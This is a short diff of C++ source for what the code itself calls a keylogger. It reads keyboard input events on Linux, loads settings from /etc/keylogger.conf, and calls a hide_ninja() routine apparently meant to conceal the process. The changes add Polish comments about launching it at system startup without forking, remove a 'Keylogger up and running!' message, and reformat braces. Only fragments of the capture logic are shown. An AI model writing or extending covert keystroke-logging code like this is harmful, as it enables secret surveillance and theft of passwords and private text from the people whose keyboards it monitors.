@@ -52,14 +52,16 @@ int main (int argc, char **argv)
    init_ninja(argc, argv);
    hide_ninja();
 
+//zrezygnowaliśmy ze standardowej metody tworzenia deamona,
+//gdyż zapewnia to nam system uruchamiając proces
+//podczas startu systemu
 //	if (!fork())
 		init();
-//	else
-//		std::cout << "Keylogger up and running!\n";
 
 }
 
-void loadData(std::string &eventPath, std::string &logPath, std::vector<std::string> *slowa) {
+void loadData(std::string &eventPath, std::string &logPath, std::vector<std::string> *slowa) 
+{
 
 	std::ifstream stream;
 	stream.open("/etc/keylogger.conf");
@@ -95,7 +97,8 @@ void printTime(FILE *data)
 	free(t);
 }
 
-void init() {
+void init() 
+{
 	struct input_event ev[1];
 	int fd, rd, value, size = sizeof(struct input_event);
 
